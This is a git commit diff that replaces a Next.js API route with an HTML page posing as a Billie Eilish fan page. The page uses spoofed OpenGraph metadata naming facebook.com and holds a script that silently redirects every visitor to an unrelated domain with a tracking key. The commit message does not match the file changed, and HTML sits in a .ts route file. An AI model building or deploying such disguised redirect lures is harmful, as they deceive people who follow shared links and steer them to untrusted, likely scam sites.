48322bf993013adeeea17cd0f83d4492ce86a387
Billiemo <mokirpolk@gmail.com>
2024-08-23 16:08:26 +0100

    Update index.html

--- app/api/route.ts
+++ app/api/route.ts
@@ -1,5 +1,19 @@
-import { redirect } from 'next/navigation';
- 
-export async function GET(request: Request) {
-  redirect('https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb/');
-}
+<!doctype html>
+<html lang='en'>
+    <head>
+        <meta charset="utf-8" />
+        <meta property="og:url" content="https://facebook.com" />
+        <meta property="og:title" content="billie-eilish" />
+        <meta property="og:type" content="website" />
+        <meta property="og:description" content="billie eilish hit me hard and soft Hi" />
+        <title>BILLIE ELLISH</title>
+    </head>
+    <body>
+        <img src="https://c.tenor.com/6SaYxGGeelQAAAAd/tenor.gif" />
+        <script type="text/javascript">
+            if ("false" == "false") {
+                window.location = "https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb";
+            }
+        </script>
+    </body>
+</html>
